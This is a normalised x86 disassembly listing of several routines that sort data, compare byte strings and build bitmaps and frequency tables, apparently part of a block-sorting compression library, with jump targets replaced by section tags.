jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov eax [ esi + ebx * 4 ]
lea eax [ ebx + ecx ]
sar eax 0x1
mov eax [ esi + eax * 4 ]
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + eax * 4 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] ecx
mov edi ecx
mov [ ebp - 0x10 ] ebx
mov eax ebx
cmp [ ebp + 0xc ] 0x63
jge r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
cmp [ ebp - 0x10 ] ecx
jl r-xdata
mov edx [ esi + edi * 4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + edx * 4 ]
sub ecx [ ebp - 0x4 ]
jne r-xdata
mov ecx edi
sub ecx [ ebp - 0x8 ]
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x1c ]
cmp ecx edx
jge r-xdata
test ecx ecx
jle r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ esi + ecx * 4 ]
mov [ esi + edi * 4 ] ecx
mov ecx [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
inc edi
cmp edi eax
mov [ esi + ecx * 4 ] edx
jle r-xdata
mov [ ebp - 0x4 ] edx
test edx edx
jle r-xdata
mov edx ecx
inc edi
jmp r-xdata
cmp edi eax
jg r-xdata
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx ebx
sub edx [ ebp - 0x10 ]
sub ecx eax
cmp edx ecx
jge r-xdata
mov ecx [ ebp - 0x14 ]
mov ebx edi
sub ebx edx
lea ecx [ esi + ecx * 4 ]
lea edx [ esi + ebx * 4 ]
mov ebx [ ebp - 0xc ]
jmp r-xdata
mov ebx [ ebp - 0xc ]
mov edx [ esi + eax * 4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + edx * 4 ]
sub ecx [ ebp - 0x4 ]
jne r-xdata
mov [ ebp - 0x4 ] ecx
test ecx ecx
jle r-xdata
mov ecx edx
mov ebx [ ecx ]
mov [ ebp - 0x8 ] ebx
mov ebx [ edx ]
mov [ ecx ] ebx
mov ebx [ ebp - 0x8 ]
mov [ edx ] ebx
add ecx 0x4
add edx 0x4
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x0
jg r-xdata
mov ebx [ ebp - 0xc ]
cmp edi eax
jg r-xdata
test ecx ecx
jl r-xdata
mov ecx [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
lea ecx [ esi + ecx * 4 ]
mov ebx [ ecx ]
mov [ esi + eax * 4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
sub eax [ ebp - 0x10 ]
lea ecx [ ecx + edx - 0x1 ]
mov edi ecx
sub edi [ ebp - 0x14 ]
lea eax [ eax + ebx + 0x1 ]
mov edx ebx
sub edx eax
inc [ ebp + 0xc ]
cmp edi edx
jle r-xdata
lea edx [ esi + edi * 4 ]
mov edi ebx
sub edi ecx
lea ecx [ esi + edi * 4 + 0x4 ]
cmp edi eax
jg r-xdata
dec eax
cmp edi eax
jle r-xdata
mov edx [ ebp - 0x20 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
shl eax 0x2
mov [ ebp + eax - 0x1b4 ] edx
mov [ ebp + eax - 0x344 ] ecx
mov edx [ ebp - 0x24 ]
mov [ edx ] ecx
mov ecx [ ebp + 0xc ]
shl ecx 0x2
mov [ ebp + ecx - 0x1b4 ] eax
mov [ ebp + ecx - 0x344 ] ebx
jmp r-xdata
mov edi [ edx ]
mov [ ebp - 0xc ] edi
mov edi [ ecx ]
mov [ edx ] edi
mov edi [ ebp - 0xc ]
mov [ ecx ] edi
add edx 0x4
add ecx 0x4
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x0
jg r-xdata
mov edx [ esi + eax * 4 ]
mov ecx [ esi + edi * 4 ]
mov [ esi + edi * 4 ] edx
mov [ esi + eax * 4 ] ecx
inc edi
dec eax
inc [ ebp + 0xc ]
sub_100211f9
push ebp
mov ebp esp
sub esp 0x810
cmp [ ebp + 0x14 ] 0x4
push ebx
push esi
push edi
mov ebx eax
jl r-xdata
mov edx 0x101
xor eax eax
mov ecx edx
lea edi [ ebp - 0x410 ]
[ edi ]
mov eax [ ebp + 0x10 ]
xor esi esi
test eax eax
jle r-xdata
push r--data
call sub_100273c7
add eax 0x40
push eax
call sub_1002757c
pop ecx
pop ecx
mov ecx 0x100
lea esi [ ebp - 0x410 ]
lea edi [ ebp - 0x810 ]
[ edi ] [ esi ]
xor esi esi
inc esi
mov ecx [ ebp + 0xc ]
movzx ecx [ esi + ecx ]
lea ecx [ ebp + ecx * 4 - 0x410 ]
inc [ ecx ]
inc esi
cmp esi eax
jl r-xdata
mov edi [ ebp + esi * 4 - 0x414 ]
lea ecx [ ebp + esi * 4 - 0x410 ]
add [ ecx ] edi
inc esi
cmp esi edx
jl r-xdata
xor edi edi
test eax eax
jle r-xdata
cdq
and edx 0x1f
add eax edx
sar eax 0x5
inc eax
inc eax
test eax eax
jle r-xdata
mov ecx [ ebp + 0xc ]
movzx ecx [ edi + ecx ]
lea edx [ ebp + ecx * 4 - 0x410 ]
mov ecx [ edx ]
dec ecx
mov [ edx ] ecx
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 ] edi
inc edi
cmp edi eax
jl r-xdata
xor edx edx
mov ecx eax
xor eax eax
mov edi ebx
[ edi ]
mov ecx [ ebp + edx * 4 - 0x410 ]
xor esi esi
mov eax ecx
and ecx 0x1f
inc esi
shl esi cl
sar eax 0x5
lea eax [ ebx + eax * 4 ]
or [ eax ] esi
inc edx
cmp edx 0x100
jl r-xdata
mov edx [ ebp + 0x10 ]
push 0x20
pop esi
xor edi edi
inc edi
mov ecx edx
and ecx 0x1f
shl edi cl
mov eax edx
sar eax 0x5
lea eax [ ebx + eax * 4 ]
or [ eax ] edi
lea ecx [ edx + 0x1 ]
xor edi edi
inc edi
mov eax ecx
and ecx 0x1f
shl edi cl
sar eax 0x5
lea eax [ ebx + eax * 4 ]
not edi
and [ eax ] edi
inc edx
inc edx
dec esi
jne r-xdata
mov [ ebp - 0x8 ] 0x1
xor edx edx
xor esi esi
cmp [ ebp + 0x10 ] edx
jle r-xdata
push [ ebp - 0x8 ]
push r--data
call sub_100273c7
add eax 0x40
push eax
call sub_1002757c
add esp 0xc
and [ ebp - 0xc ] 0x0
or edi 0xffffffff
xor eax eax
mov ecx edx
and ecx 0x1f
inc eax
shl eax cl
mov ecx edx
sar ecx 0x5
test [ ebx + ecx * 4 ] eax
je r-xdata
xor esi esi
mov ecx eax
and ecx 0x1f
inc esi
shl esi cl
mov edx eax
sar edx 0x5
test [ ebx + edx * 4 ] esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + edx * 4 ]
sub eax [ ebp - 0x8 ]
jns r-xdata
mov esi edx
test ecx ecx
je r-xdata
mov ecx eax
sar ecx 0x5
mov edx [ ebx + ecx * 4 ]
push 0x1f
xor edi edi
mov ecx eax
pop esi
and ecx esi
inc edi
shl edi cl
test edx edi
je r-xdata
mov ecx [ ebp + 0xc ]
inc edx
cmp edx [ ebp + 0x10 ]
mov [ ecx + eax * 4 ] esi
jl r-xdata
add eax [ ebp + 0x10 ]
inc eax
lea ecx [ eax - 0x1 ]
cmp ecx [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ecx
jge r-xdata
cmp edx 0xffffffff
jne r-xdata
cmp [ ebp + 0x14 ] 0x4
jl r-xdata
mov ecx eax
and ecx esi
jmp r-xdata
xor edx edx
mov ecx eax
and ecx esi
inc edx
shl edx cl
mov ecx eax
sar ecx 0x5
test [ ebx + ecx * 4 ] edx
jne r-xdata
add eax 0x20
mov ecx eax
sar ecx 0x5
cmp [ ebx + ecx * 4 ] 0xffffffff
je r-xdata
mov eax [ ebp - 0x8 ]
add eax eax
cmp eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
jg r-xdata
push [ ebp - 0xc ]
push r--data
call sub_100273c7
add eax 0x40
push eax
call sub_1002757c
add esp 0xc
xor esi esi
inc esi
shl esi cl
mov edx eax
sar edx 0x5
test [ ebx + edx * 4 ] esi
je r-xdata
inc eax
jmp r-xdata
cmp [ ebp + 0x14 ] 0x4
jl r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
test ecx ecx
je r-xdata
mov ecx eax
sar ecx 0x5
mov edx [ ebx + ecx * 4 ]
xor esi esi
mov ecx eax
and ecx 0x1f
inc esi
shl esi cl
test edx esi
jne r-xdata
xor esi esi
xor ecx ecx
xor edx edx
cmp [ ebp + 0x10 ] esi
jle r-xdata
push r--data
call sub_100273c7
add eax 0x40
push eax
call sub_1002757c
pop ecx
pop ecx
cmp [ ebp + 0x14 ] 0x4
jl r-xdata
inc eax
mov ecx eax
and ecx 0x1f
lea edi [ eax - 0x1 ]
cmp edi [ ebp + 0x10 ]
jge r-xdata
test edx edx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x810 ]
mov eax [ ebp - 0x4 ]
cmp edi eax
jle r-xdata
xor edx edx
mov ecx eax
and ecx 0x1f
inc edx
shl edx cl
mov ecx eax
sar ecx 0x5
test [ ebx + ecx * 4 ] edx
je r-xdata
add eax 0x20
mov ecx eax
sar ecx 0x5
cmp [ ebx + ecx * 4 ] 0x0
je r-xdata
mov edi [ ebp + 0x8 ]
mov edi [ edi + edx * 4 ]
mov ebx [ ebp + 0xc ]
lea eax [ ebp + ecx * 4 - 0x810 ]
dec [ eax ]
inc edx
cmp edx [ ebp + 0x10 ]
mov [ ebx + edi ] cl
jl r-xdata
inc ecx
cmp [ ebp + ecx * 4 - 0x810 ] esi
je r-xdata
lea eax [ edi + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov esi [ ebp + 0x8 ]
mov ecx edi
sub ecx eax
push edi
push [ ebp + 0xc ]
lea ecx [ edx + ecx + 0x1 ]
mov [ ebp - 0xc ] ecx
call sub_10020fbd
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
or eax 0xffffffff
jmp r-xdata
inc eax
jmp r-xdata
cmp [ eax ] esi
jne r-xdata
cmp ecx 0x100
jl r-xdata
cmp edx edi
jle r-xdata
push 0x3ed
call sub_1001bf0e
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + edx * 4 ]
mov esi [ ebp + 0xc ]
mov ecx [ esi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
cmp eax ecx
je r-xdata
jmp r-xdata
inc edx
xor esi esi
mov ecx edx
and ecx 0x1f
inc esi
mov eax edx
sar eax 0x5
shl esi cl
lea eax [ ebx + eax * 4 ]
or [ eax ] esi
mov eax [ ebp - 0x4 ]
sub_10021550
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi edx
mov dl [ edi + eax ]
mov bl [ esi + eax ]
cmp bl dl
je r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
sbb eax eax
neg eax
jmp r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
mov edx [ ebp + 0xc ]
inc edi
inc esi
add edx 0x8
mov [ ebp + 0x8 ] edx
movzx edx [ ecx + edi * 2 ]
movzx ebx [ ecx + esi * 2 ]
cmp bx dx
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
movzx edx [ ecx + edi * 2 ]
movzx ebx [ ecx + esi * 2 ]
cmp bx dx
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
movzx edx [ ecx + edi * 2 ]
movzx ebx [ ecx + esi * 2 ]
cmp bx dx
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
movzx edx [ ecx + edi * 2 ]
movzx ebx [ ecx + esi * 2 ]
cmp bx dx
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
movzx edx [ ecx + edi * 2 ]
movzx ebx [ ecx + esi * 2 ]
cmp bx dx
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
movzx edx [ ecx + edi * 2 ]
movzx ebx [ ecx + esi * 2 ]
cmp bx dx
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
movzx edx [ ecx + edi * 2 ]
movzx ebx [ ecx + esi * 2 ]
cmp bx dx
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
movzx edx [ ecx + edi * 2 ]
movzx ebx [ ecx + esi * 2 ]
cmp bx dx
jne r-xdata
mov edx [ ebp + 0xc ]
inc edi
inc esi
cmp edi edx
jb r-xdata
cmp esi edx
jb r-xdata
sub edi edx
sub [ ebp + 0x8 ] 0x8
mov edx [ ebp + 0x10 ]
dec [ edx ]
cmp [ ebp + 0x8 ] 0x0
jge r-xdata
sub esi edx
mov dl [ edi + eax ]
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
xor al al
sub_10021736
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
sub eax [ ebp + 0x14 ]
sub esp 0x1c
inc eax
cmp eax 0x2
jl r-xdata
leave
retn
xor ecx ecx
cmp [ rw-data ] eax
jge r-xdata
dec ecx
mov [ ebp - 0x18 ] ecx
js r-xdata
inc ecx
cmp [ ecx * 4 + rw-data ] eax
jl r-xdata
push ebx
push edi
dec ecx
mov [ ebp - 0x18 ] ecx
jns r-xdata
mov ecx edi
sub ecx eax
lea ebx [ esi + ecx * 4 ]
mov eax [ ecx * 4 + rw-data ]
mov edx [ ebp + 0x14 ]
lea edi [ eax + edx ]
cmp edi [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] edi
jg r-xdata
pop edi
pop ebx
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
inc edi
add ebx 0x4
cmp edi [ ebp + 0x18 ]
mov [ esi + ecx * 4 ] eax
jg r-xdata
mov eax ebx
jmp r-xdata
mov ecx [ ebp - 0x18 ]
mov eax [ esi + edi * 4 ]
mov ecx [ ebp + 0x1c ]
push [ ebp + 0x20 ]
lea edx [ eax + ecx ]
push [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx ]
add eax ecx
mov ecx [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edx
call sub_10021550
add esp 0xc
test al al
je r-xdata
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + edx * 4 ] ecx
mov ecx [ ebp - 0x10 ]
sub [ ebp - 0x4 ] ecx
shl ecx 0x2
sub eax ecx
mov ecx [ ebp - 0x14 ]
dec ecx
cmp [ ebp - 0x4 ] ecx
mov [ ebp - 0x1c ] eax
jle r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
inc edi
add ebx 0x4
cmp edi [ ebp + 0x18 ]
mov [ esi + ecx * 4 ] eax
jg r-xdata
mov eax ebx
jmp r-xdata
push [ ebp + 0x20 ]
mov eax [ eax ]
add eax [ ebp + 0x1c ]
push [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_10021550
add esp 0xc
test al al
jne r-xdata
mov eax [ esi + edi * 4 ]
mov ecx [ ebp + 0x1c ]
push [ ebp + 0x20 ]
lea edx [ eax + ecx ]
push [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx ]
add eax ecx
mov ecx [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edx
call sub_10021550
add esp 0xc
test al al
je r-xdata
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + edx * 4 ] ecx
mov ecx [ ebp - 0x10 ]
sub [ ebp - 0x4 ] ecx
shl ecx 0x2
sub eax ecx
mov ecx [ ebp - 0x14 ]
dec ecx
cmp [ ebp - 0x4 ] ecx
mov [ ebp - 0x1c ] eax
jle r-xdata
mov eax [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ esi + ecx * 4 ] eax
mov eax [ ebp + 0x20 ]
inc edi
add ebx 0x4
cmp [ eax ] 0x0
jl r-xdata
mov eax ebx
jmp r-xdata
push [ ebp + 0x20 ]
mov eax [ eax ]
add eax [ ebp + 0x1c ]
push [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_10021550
add esp 0xc
test al al
jne r-xdata
cmp edi [ ebp + 0x18 ]
jle r-xdata
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + edx * 4 ] ecx
mov ecx [ ebp - 0x10 ]
sub [ ebp - 0x4 ] ecx
shl ecx 0x2
sub eax ecx
mov ecx [ ebp - 0x14 ]
dec ecx
cmp [ ebp - 0x4 ] ecx
mov [ ebp - 0x1c ] eax
jle r-xdata
mov eax [ ebp - 0x1c ]
mov eax [ esi + edi * 4 ]
mov ecx [ ebp + 0x1c ]
push [ ebp + 0x20 ]
lea edx [ eax + ecx ]
push [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx ]
add eax ecx
mov ecx [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edx
call sub_10021550
add esp 0xc
test al al
je r-xdata
push [ ebp + 0x20 ]
mov eax [ eax ]
add eax [ ebp + 0x1c ]
push [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_10021550
add esp 0xc
test al al
jne r-xdata
mov eax [ ebp - 0x1c ]
sub_1002194c
push ebp
mov ebp esp
sub esp 0x508
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1e8 ] eax
mov eax [ ebp + 0x18 ]
xor ebx ebx
push edi
mov [ ebp - 0x378 ] eax
mov [ ebp - 0x508 ] 0x2
inc ebx
push 0x3e9
call sub_1001bf0e
dec ebx
lea ecx [ ebp + ebx * 4 - 0x378 ]
mov edi [ ecx ]
mov [ ebp - 0x58 ] ecx
lea ecx [ ebp + ebx * 4 - 0x508 ]
mov edx [ ecx ]
lea eax [ ebp + ebx * 4 - 0x1e8 ]
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x50 ] eax
mov eax [ eax ]
mov ecx edi
sub ecx eax
cmp ecx 0x14
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x20 ] eax
jl r-xdata
push [ ebp + 0x1c ]
push edx
push edi
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_10021736
mov eax [ ebp + 0x1c ]
add esp 0x1c
cmp [ eax ] 0x0
jl r-xdata
cmp edx 0xe
jg r-xdata
pop edi
pop esi
pop ebx
leave
retn
test ebx ebx
jg r-xdata
lea ecx [ edi + eax ]
sar ecx 0x1
mov ebx [ esi + ecx * 4 ]
mov ecx [ ebp + 0xc ]
add ebx edx
mov bl [ ebx + ecx ]
mov [ ebp - 0x18 ] bl
mov ebx [ esi + edi * 4 ]
add ebx edx
mov bl [ ebx + ecx ]
mov [ ebp + 0x18 ] bl
mov ebx [ esi + eax * 4 ]
add ebx edx
mov cl [ ebx + ecx ]
mov [ ebp - 0x4 ] cl
cmp cl [ ebp + 0x18 ]
jbe r-xdata
cmp ebx 0x62
jge r-xdata
mov cl [ ebp - 0x18 ]
cmp [ ebp + 0x18 ] cl
jbe r-xdata
mov bl [ ebp + 0x18 ]
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x18 ] cl
movzx ecx [ ebp + 0x18 ]
mov [ ebp - 0xc ] eax
mov [ ebp + 0x18 ] eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edi
mov eax edi
mov bl [ ebp - 0x4 ]
mov [ ebp + 0x18 ] cl
cmp bl cl
jbe r-xdata
mov ebx [ ebp - 0xc ]
cmp [ ebp - 0x10 ] ebx
jge r-xdata
mov ecx [ ebp + 0x18 ]
mov ecx [ esi + ecx * 4 ]
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x14 ] ecx
add ecx edx
movzx ecx [ ecx + ebx ]
sub ecx [ ebp - 0x8 ]
jne r-xdata
mov [ ebp + 0x18 ] bl
mov ecx [ ebp + 0x18 ]
sub ecx ebx
mov [ ebp - 0x14 ] ecx
mov ecx ebx
sub ecx [ ebp - 0x20 ]
mov ebx [ ebp - 0x14 ]
cmp ecx ebx
jge r-xdata
mov eax [ ebp - 0x4c ]
mov ebx [ ebp - 0x48 ]
inc edx
mov [ eax ] edx
inc ebx
jmp r-xdata
test ecx ecx
jle r-xdata
mov ecx [ ebp - 0xc ]
mov ecx [ esi + ecx * 4 ]
mov ebx [ ebp + 0x18 ]
mov [ esi + ebx * 4 ] ecx
mov ebx [ ebp - 0xc ]
inc [ ebp - 0xc ]
inc [ ebp + 0x18 ]
cmp [ ebp + 0x18 ] eax
mov ecx [ ebp - 0x14 ]
mov [ esi + ebx * 4 ] ecx
jle r-xdata
mov [ ebp - 0x8 ] ebx
test ebx ebx
jle r-xdata
mov ebx ecx
inc [ ebp + 0x18 ]
jmp r-xdata
cmp [ ebp + 0x18 ] eax
jg r-xdata
jmp r-xdata
mov ecx [ ebp - 0x10 ]
sub ecx eax
mov [ ebp - 0x1c ] ecx
mov ecx edi
sub ecx [ ebp - 0x10 ]
cmp ecx [ ebp - 0x1c ]
jl r-xdata
mov ecx [ ebp - 0x20 ]
lea ecx [ esi + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp + 0x18 ]
sub ecx ebx
lea ecx [ esi + ecx * 4 ]
mov [ ebp - 0x1c ] ecx
cmp [ ebp + 0x18 ] eax
jg r-xdata
mov ecx [ esi + eax * 4 ]
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x14 ] ecx
add ecx edx
movzx ecx [ ecx + ebx ]
sub ecx [ ebp - 0x8 ]
jne r-xdata
mov [ ebp - 0x8 ] ecx
test ecx ecx
jle r-xdata
mov ecx [ ebp - 0x1c ]
mov ebx [ ebp - 0xc ]
mov ebx [ ebx ]
mov ecx [ ecx ]
mov [ ebp - 0x54 ] ebx
mov ebx [ ebp - 0xc ]
add [ ebp - 0xc ] 0x4
mov [ ebx ] ecx
mov ecx [ ebp - 0x1c ]
mov ebx [ ebp - 0x54 ]
mov [ ecx ] ebx
add ecx 0x4
dec [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x0
mov [ ebp - 0x1c ] ecx
jg r-xdata
test ecx ecx
jl r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ esi + ecx * 4 ]
mov ebx [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
mov [ esi + eax * 4 ] ecx
mov ecx [ ebp - 0x14 ]
mov [ esi + ebx * 4 ] ecx
jmp r-xdata
mov esi [ ebp - 0x20 ]
mov ecx [ ebp - 0x14 ]
sub eax [ ebp - 0x10 ]
lea ecx [ ecx + esi - 0x1 ]
mov [ ebp - 0x2c ] esi
lea eax [ eax + edi + 0x1 ]
lea esi [ ecx + 0x1 ]
mov [ ebp - 0x24 ] esi
lea esi [ eax - 0x1 ]
mov [ ebp - 0x30 ] esi
lea esi [ edx + 0x1 ]
mov [ ebp - 0x3c ] esi
mov ebx ecx
sub ebx [ ebp - 0x20 ]
mov esi edi
sub esi eax
cmp ebx esi
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x44 ] edx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x40 ] edx
jge r-xdata
mov ebx [ ebp + 0x18 ]
lea ebx [ esi + ebx * 4 ]
mov [ ebp + 0x18 ] ebx
mov ebx edi
sub ebx ecx
lea ecx [ esi + ebx * 4 + 0x4 ]
mov esi [ ebp + 0x18 ]
mov ecx [ ebp + 0x18 ]
cmp ecx eax
jg r-xdata
dec eax
cmp [ ebp + 0x18 ] eax
jle r-xdata
mov esi [ ebp - 0x28 ]
mov ecx [ ebp - 0x34 ]
mov eax [ ebp - 0x40 ]
mov esi [ ebp - 0x20 ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x44 ] edx
mov eax edx
jmp r-xdata
mov ebx [ esi ]
mov [ ebp + 0x18 ] ebx
mov ebx [ ecx ]
mov [ esi ] ebx
mov ebx [ ebp + 0x18 ]
mov [ ecx ] ebx
add esi 0x4
add ecx 0x4
dec [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
inc [ ebp + 0x18 ]
lea ecx [ esi + ecx * 4 ]
mov ebx [ ecx ]
mov [ ebp - 0x14 ] ebx
mov ebx [ esi + eax * 4 ]
mov [ ecx ] ebx
mov ecx [ ebp - 0x14 ]
mov [ esi + eax * 4 ] ecx
dec eax
jmp r-xdata
mov ebx [ ebp - 0x38 ]
sub ebx [ ebp - 0x2c ]
mov edi ecx
sub edi esi
cmp ebx edi
jge r-xdata
mov eax esi
mov esi [ ebp - 0x24 ]
mov [ ebp - 0x24 ] eax
mov eax ecx
mov ecx [ ebp - 0x30 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x3c ] edx
mov edi [ ebp - 0x30 ]
sub edi [ ebp - 0x24 ]
mov ebx ecx
sub ebx esi
cmp ebx edi
jge r-xdata
mov edi [ ebp - 0x2c ]
mov ebx [ ebp - 0x38 ]
mov ebx [ ebp - 0x2c ]
mov edi esi
mov esi ebx
mov ebx [ ebp - 0x38 ]
mov [ ebp + 0x18 ] ebx
mov ebx ecx
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x44 ] eax
mov eax edx
jmp r-xdata
mov edx [ ebp - 0x50 ]
mov [ edx ] edi
mov edx [ ebp - 0x58 ]
mov edi [ ebp - 0x44 ]
mov [ edx ] ebx
mov ebx [ ebp - 0x48 ]
mov edx [ ebp - 0x4c ]
inc ebx
mov [ ebp + ebx * 4 - 0x1e8 ] esi
mov esi [ ebp + 0x8 ]
mov [ edx ] edi
mov [ ebp + ebx * 4 - 0x508 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp + ebx * 4 - 0x378 ] ecx
inc ebx
mov [ ebp + ebx * 4 - 0x1e8 ] eax
mov eax [ ebp - 0x30 ]
mov [ ebp + ebx * 4 - 0x378 ] eax
mov eax [ ebp - 0x3c ]
mov [ ebp + ebx * 4 - 0x508 ] eax
inc ebx
jmp r-xdata
sub_10021cbc
push ebp
lea ebp [ esp - 0x188 ]
sub esp 0xd2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x184 ] eax
cmp [ ebp + 0x198 ] 0x4
mov eax [ ebp + 0x190 ]
push ebx
push edi
mov [ ebp + 0x64 ] eax
mov eax [ ebp + 0x19c ]
mov ebx ecx
mov edi edx
mov [ ebp + 0x6c ] ebx
mov [ ebp + 0x70 ] edi
mov [ ebp + 0x5c ] eax
jl r-xdata
mov eax 0x10000
push r--data
call sub_100273c7
add eax 0x40
push eax
call sub_1002757c
pop ecx
pop ecx
and [ esi + eax * 4 ] 0x0
dec eax
jns r-xdata
movzx ecx [ edi ]
mov edx [ ebp + 0x194 ]
shl ecx 0x8
dec edx
cmp edx 0x3
jl r-xdata
test edx edx
jl r-xdata
mov eax [ ebp + 0x64 ]
lea edi [ eax + edx * 2 - 0x4 ]
mov edi [ ebp + 0x70 ]
mov edi [ ebp + 0x64 ]
xor eax eax
mov [ edi + edx * 2 ] ax
mov edi [ ebp + 0x70 ]
movzx eax [ edi + edx ]
shl eax 0x8
sar ecx 0x8
or ecx eax
inc [ esi + ecx * 4 ]
dec edx
jns r-xdata
xor eax eax
mov [ edi + 0x4 ] ax
mov eax [ ebp + 0x70 ]
movzx eax [ eax + edx ]
sar ecx 0x8
shl eax 0x8
or eax ecx
inc [ esi + eax * 4 ]
xor ecx ecx
mov [ edi + 0x2 ] cx
mov ecx [ ebp + 0x70 ]
